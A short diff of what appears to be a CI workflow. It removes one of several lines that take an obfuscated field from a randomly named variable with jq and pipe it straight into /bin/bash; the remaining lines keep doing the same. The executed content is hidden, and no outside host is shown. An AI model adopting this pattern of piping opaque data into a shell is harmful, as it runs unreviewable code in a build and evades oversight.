@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$mu2229" | jq -r .r6282 | /bin/bash
           echo $acx18779 | jq -r .kjwx426 | /bin/bash
           echo $asg9 | jq -r .ozprh31136 | /bin/bash
-          printf '%s' "$u4560" | jq -r .iawl5861 | /bin/bash
           echo $pjb9 | jq -r .uwva9685 | /bin/bash
 
       - name: Save archive
